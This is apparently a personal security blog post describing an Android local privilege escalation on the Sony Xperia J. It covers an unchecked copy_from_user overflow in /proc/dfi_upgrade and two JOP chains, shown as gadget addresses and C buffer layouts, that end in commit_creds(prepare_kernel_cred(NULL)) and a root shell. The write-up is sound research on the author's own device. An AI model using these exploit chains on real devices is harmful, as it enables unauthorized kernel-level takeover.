---
published: true
title: "💾 An 0-day for the Xperia J (haha it rhymes)"
toc: true
toc_sticky: true
tags:
  - Linux Kernel Driver
  - Binary Exploitation
  - Android LPE
tagline: "I got my hands on a phone I really wanted when I was 13 - the Sony Xperia J. I then went on to find a nice and easy bug, with an easy-enough exploit to go with it for a root shell!"
---

I always find myself reminiscing of the days when I was 13-15, when my only problem was homework and getting Black Ops 2 camos. Back then I was super into phones, I'd always be trying to get my hands on a phone to root. I'd never use root access for anything useful, but I guess I enjoyed the process?

Recently, I ordered a bunch of phones to re-sell (but realistically they will sit in my cupboard for probably the rest of my life), and included with these phones was a Sony Xperia J. 

Back in the good old days, I always wanted one of these phones, I absolutely loved notification lights on phones (and still do, although that feature seems to be long gone now), and this phone having an entire light bar was absolutely awesome. I never did get my hands on one, but now I do, and as an ode to younger Luke who was throwing random malware at his phone to get root, I figured it would be cool to pop a root shell on it.

# Drivers

I had a browse through **/proc** and **/dev** and the following driver looked like a good place to start:

In **/proc**:

```
-rw-rw-rw- root     root            0 2017-06-19 18:12 dfi_upgrade
```

## **/proc/dfi_upgrade** Overflow

I had a look at the write function for this driver on some [open source code](https://github.com/sladebot/Vengeance-Kernel-MSM7x27-JLO/blob/1ffb2e4a2656c2003368fbbdfa5eaa5a1caa4756/drivers/power/fih_bq275x0_RomMode.c#L451C1-L452C77) for the device:

```c
static int
bq275x0_dfi_upgrade_proc_write(struct file *file, const char __user *buffer,
               unsigned long count, void *data)
{
    dev_info(&bq275x0_client->dev, "procfile_write (/proc/dfi_upgrade) called\n");
    
    if (copy_from_user(cmd, buffer, count)) 
        return -EFAULT;
    else if (!strncmp(cmd, "flash22685511@FIHLX\n", count)) 
        bq275x0_flash();
    else if (!strncmp(cmd, "invalidmfg22685511@FIHLX\n", count)) {
        unsigned char invalid_mfg_info[32];
    
        invalid_mfg_info[0] = 0;
        memcpy(&invalid_mfg_info[1], cmd, sizeof(invalid_mfg_info) - 1);
        bq275x0_battery_write_MfgInfo(invalid_mfg_info, sizeof(invalid_mfg_info));
    }
    
    return count;
}
```

Where **cmd** is defined as:

```
static char cmd[256];
```

Ah, well that was an easy bug hunt! If you haven't spotted it yet, there are no checks on the amount of data getting fed into **copy_from_user**, so you can just overflow the 256-byte **cmd** buffer.

# Getting the Kernel

As the device isn't mediatek, I can't just do the usual *throw mtkclient at it* approach.

The device is build version **ST26a_11.2.A.0.31**, I searched online and found a legit-ish site that is [hosting the firmware](https://samsony.net/en/firmwares/sony/ST26A/download/371). So I downloaded that, and got a **ST26a_11.2.A.0.31--www.SamSony.net--.zip** file, which contains **ST26a_11.2.A.0.31--www.SamSony.net--.ftf** when extracted. Extract that again, and you get a bunch of files:

![firmware_files.png](/assets/images/other/xperia_j/firmware_files.png)

I assume **kernel.sin** is what we are looking for. I had a look around and found [a guide](https://xdaforums.com/t/howto-dev-unpack-pack-sony-firmware-kernel-initramfs-linux-only.2418893/) on good old XDA forums on how to extract the kernel.

Unfortunately, all of the links to the tools are dead, so I had to do some sleuthing. I found a couple of scripts [here](https://github.com/scintill/sony-tools), and found the final **mkelf.py** script [here](https://github.com/sonyxperiadev/device-sony-lt26/blob/28bf4ac86d28e5c0824f4a135fff272adeff95a5/tools/mkelf.py#L39).

After porting the **mkelf.py** script from **python2** to **python3**, I was able to follow the guide, and get a **kernel.elf** file with symbols that could be loaded into Ghidra.

# Exploit

Now that we have a bug and a kernel, we can start throwing stuff at the driver and see what dies, so lets just throw a massive string at it:

![cpu_freq_crash.png](/assets/images/other/xperia_j/cpu_freq_crash.png)

Interesting, a crash in **__cpufreq_cpu_get**. Now that we have the kernel, we can see whats going on there:

![crash_location.png](/assets/images/other/xperia_j/crash_location.png)

The issue is that we are clobbering the **cpufreq_driver**, which usually contains a pointer (or NULL). So it is dereferencing this, and as we have overwritten massively out of the bounds of the global memory, we overwrite it with *0x41414141*, therefore causing the crash!

Lets set it to be a valid pointer and see if we get a different crash.

![srcu_read_lock_crash.png](/assets/images/other/xperia_j/srcu_read_lock_crash.png)

Nice, another crash, this time in **__srcu_read_lock** due to a clobbered **r3**:

![crash_location_srcu_read_lock.png](/assets/images/other/xperia_j/crash_location_srcu_read_lock.png)

Looks like we have a dodgy **param_1**, after tracing up a bit and trying to find object we would have overwritten getting used, I came across this:

![cpufreq_notify_transition.png](/assets/images/other/xperia_j/cpufreq_notify_transition.png)

Once of the **srcu_notifier_call_chain** functions is getting called with a controlled **param_1** due to our overwrite! Lets take a closer look at the function:

![__srcu_notifier_call_chain.png](/assets/images/other/xperia_j/__srcu_notifier_call_chain.png)

So we can see the **__srcu_read_lock** we are crashing in, which is using a pointer we have overwritten (which should be fixable). We don't really get an interesting primitives in there, other than a completely uncontrolled increment primitive. Lets take a look at the **notifier_call_chain**:

![notifier_call_chain.png](/assets/images/other/xperia_j/notifier_call_chain.png)

I think this is the first project where everything has just gone right the first time, there's a super easy execution primitive in that function, we just need the following:
- The pointer we control should point to a controlled address we want to execute
- Four bytes after the address of the function should be the argument we want to pass into the function

![well_meme.png](/assets/images/other/xperia_j/well_meme.png)

After putting things in the right place, we have execution in the kernel with an argument, and another thing to note is that **r0** points to controlled memory, which will be useful later:

![execution.png](/assets/images/other/xperia_j/execution.png)

## JOP-Chain

Although we have execution, that doesn't mean we can just pop a root shell trivially. We aren't in control of the task that executes this callback, so if we wrote an exploit that just jumped to code that executes **commit_creds(prepare_kernel_cred(NULL));** it wouldn't impact our program, but some random task in the kernel would get root privileges - not very useful.

So we'll need to split this JOP-chain into two parts:
1. Use the execution primitive with an argument to overwrite some function address in the kernel
2. Trigger the call of the overwritten function address in the process we want root in, this will execute the second JOP-chain to execute **commit_creds(prepare_kernel_cred(NULL));**

### Part 1

This is quite a simple chain, we basically exploit the fact that **r0** points into our controlled buffer, and use this to load the address we wish to patch. Then we also use the **r8** register we control to specify what we want to write the loaded value. Finally there is a write gadget that patches the address, and returns execution back.

```c
// THIS IS THE INITIAL JOP CHAIN THAT JUST PATCHES AN IOCTL

// [G0] INCREMENT R0 A BIT FOR LATER GADGET
// c0564460 48 30 90 e5     ldr        r3,[r0,#0x48]
// c0564464 00 00 53 e3     cmp        r3,#0x0
// c0564468 01 00 00 0a     beq        LAB_c0564474
// c056446c 10 00 80 e2     add        r0,r0,#0x10
// c0564470 33 ff 2f e1     blx        r3

// [G1] GET JOP CHAIN ADDRESS INTO R5
// c033ebb4 08 30 90 e5     ldr        r3,[r0,#0x8]
// c033ebb8 d0 10 a0 e3     mov        r1,#0xd0         // ignore
// c033ebbc 00 50 a0 e1     cpy        r5,r0
// c033ebc0 08 30 93 e5     ldr        r3,[r3,#0x8]
// c033ebc4 33 ff 2f e1     blx        r3

// [G2] LOAD R4 VALUE FOR WRITE
// c041bff0 b4 30 90 e5     ldr        r3,[r0,#0xb4]
// c041bff4 01 20 a0 e1     cpy        r2,r1            // ignore
// c041bff8 b8 40 90 e5     ldr        r4,[r0,#0xb8]
// c041bffc 08 30 93 e5     ldr        r3,[r3,#0x8]
// c041c000 33 ff 2f e1     blx        r3

// [G3] DO THE WRITE
// c048c9b0 70 80 84 e5     str        r8,[r4,#0x70]
// c048c9b4 00 30 95 e5     ldr        r3,[r5,#0x0]
// c048c9b8 04 00 a0 e1     cpy        r0,r4
// c048c9bc 33 ff 2f e1     blx        r3

*(uint32_t *)&buffer[0x48] = 0xc033ebb4; // [G0] Address of [G1]

*(uint32_t *)&buffer[0x10 + 0x8] = KERNEL_CMD_BUFF_BASE + 0x14; // [G1] Pointer to address of [G2]
*(uint32_t *)&buffer[0x14 + 0x8] = 0xc041bff0; // [G1] Address of [G2] (plus 0x8 because r3,r3[0x8])

*(uint32_t *)&buffer[0x10 + 0xb4] = KERNEL_CMD_BUFF_BASE + 0x20; // [G2] Pointer to address of [G3]
*(uint32_t *)&buffer[0x20 + 0x8] = 0xc048c9b0; // [G2] Address of [G3]  (plus 0x8 because r3,r3[0x8])
*(uint32_t *)&buffer[0x10 + 0xb8] = WRITE_TARGET - 0x70; // [G2] Address to write to - 0x70

*(uint32_t *)&buffer[0x10 + 0x0] = 0xc0589e90; // [G3] Normal return address for fixup
```

In terms of addresses to patch, I just went with an easy option and patched the **ioctl** handler for **/dev/dbgcfgtool**. This is patched to point to the first gadget of the second JOP-chain.

With the handler patched, we should be able to cause the kernel to crash by calling the **ioctl** to make sure it worked:

![ioctl_test_crash.png](/assets/images/other/xperia_j/ioctl_test_crash.png)

Nice! Also worth noting that we have control of r1, r2, and r4 - albeit **r2==r4**.

### Part 2

This is the JOP-chain executed by our task so that our process elevates to root privileges. It uses a couple of function-call JOP gadgets, while maintaining the result of **prepare_kernel_cred** to pass into **commit_creds**. It uses the control we have of **r1** for the dispatcher table, and uses **r2** to store a gadget address used by one of the JOP gadgets.

```c
// THIS IS THE JOP CHAIN WE WILL CALL TO GET ROOT AFTER WE HAVE PATCHED THE IOCTL

// loads of space for JOP-chain
// address of first gadget is written with previous job chain
// we have control of r2==r4 and r1
// set r1 to be the address of the JOP buffer (plus offset maybe)
// set r2==r4 to be the address of the gadget before prepare_kernel_cred call 

// [G0] COPY R1 INTO R0
// c00bd190 01 00 a0 e1     cpy        r0,r1
// c00bd194 00 30 91 e5     ldr        r3,[r1,#0x0]
// c00bd198 02 60 a0 e1     cpy        r6,r2                // ignore
// c00bd19c 33 ff 2f e1     blx        r3

// [G1] COPY R2 INTO R8
// c023a7c4 02 80 a0 e1     cpy        r8,r2
// c023a7c8 18 30 91 e5     ldr        r3,[r1,#0x18]
// c023a7cc 01 60 a0 e1     cpy        r6,r1
// c023a7d0 00 00 53 e3     cmp        r3,#0x0              // ignore
// c023a7d4 00 00 00 0a     beq        LAB_c023a7dc         // ignore
// c023a7d8 33 ff 2f e1     blx        r3

// [G2] COPY JOP CHAIN ADDRESS INTO R4
// c0014568 00 40 a0 e1     cpy        r4,r0
// c001456c bc 30 90 e5     ldr        r3,[r0,#0xbc]
// c0014570 33 ff 2f e1     blx        r3

// [G3] CLEAR R5 TO COPY LATER
// c02db974 c8 30 94 e5     ldr        r3,[r4,#0xc8]
// c02db978 34 30 83 e2     add        r3,r3,#0x34
// c02db97c 03 21 94 e7     ldr        r2,[r4,r3,lsl #0x2]
// c02db980 5c 30 94 e5     ldr        r3,[r4,#0x5c]
// c02db984 03 00 52 e1     cmp        r2,r3
// c02db988 00 80 a0 13     movne      r8,#0x0              // ignore
// c02db98c 02 00 00 1a     bne        LAB_c02db99c         // ignore
// c02db990 60 00 94 e5     ldr        r0,[r4,#0x60]        // ignore
// c02db994 38 ff 2f e1     blx        r8

// [G4] FUNCTION CALL GADGET for prepare_kernel_cred
// c0027280 33 ff 2f e1     blx        r3
// c0027284 4c 30 94 e5     ldr        r3,[r4,#0x4c]
// c0027288 33 ff 2f e1     blx        r3

// [G5] FUNCTION CALL GADGET for commit_creds
// c0408910 10 30 94 e5     ldr        r3,[r4,#0x10]
// c0408914 33 ff 2f e1     blx        r3
// c0408918 14 30 94 e5     ldr        r3,[r4,#0x14]
// c040891c 01 00 a0 e3     mov        r0,#0x1
// c0408920 33 ff 2f e1     blx        r3

*(uint32_t *)&buffer[SECOND_JOP_OFFSET] = 0xc023a7c4; // [G0] address of [G1]

*(uint32_t *)&buffer[SECOND_JOP_OFFSET + 0x18] = 0xc0014568; // [G1] address of [G2]

*(uint32_t *)&buffer[SECOND_JOP_OFFSET + 0xbc] = 0xc02db974; // [G2] address of [G3]

*(uint32_t *)&buffer[SECOND_JOP_OFFSET + 0xc8] = 0x0; // [G3] first r3 val loaded, set to zero becomes 0x34 mul by 0x4 = 0xd0, see below
*(uint32_t *)&buffer[SECOND_JOP_OFFSET + 0xd0] = PREPARE_KERNEL_CRED_ADDR; // [G3] must be equal to below value (prepare_kernel_cred address)
*(uint32_t *)&buffer[SECOND_JOP_OFFSET + 0x5c] = PREPARE_KERNEL_CRED_ADDR; // [G3] must be equal to above value (prepare_kernel_cred address)
*(uint32_t *)&buffer[SECOND_JOP_OFFSET + 0x60] = 0x0; // [G3] must be NULL for the prepare_kernel_cred address

*(uint32_t *)&buffer[SECOND_JOP_OFFSET + 0x4c] = 0xc0408910; // [G4] Address of [G5]

*(uint32_t *)&buffer[SECOND_JOP_OFFSET + 0x10] = COMMIT_CREDS_ADDR; // [G5] Address of commit_creds
*(uint32_t *)&buffer[SECOND_JOP_OFFSET + 0x14] = 0xc011ffd8; // [G5] Normal return address for fixup
```

With that JOP-chain, our process should get root privileges when we call that **ioctl**.

## Popping Shell

Now we can finally pop a root shell!

![root.gif](/assets/images/other/xperia_j/root.gif)

# Conclusion

After coming off of the Mali Utgard project, that felt a lot easier! If I showed 13 year old me this he'd probably think this is cool as hell, so thats scratched the nostalgic itch for me. I had a lot of fun writing this exploit, JOP feels much more limited than ROP which I find even more interesting. I hope you enjoyed - [check out the code for this project here](https://github.com/lr-m/SonyXperiaJRoot).

![bye.gif](/assets/images/other/xperia_j/bye.gif)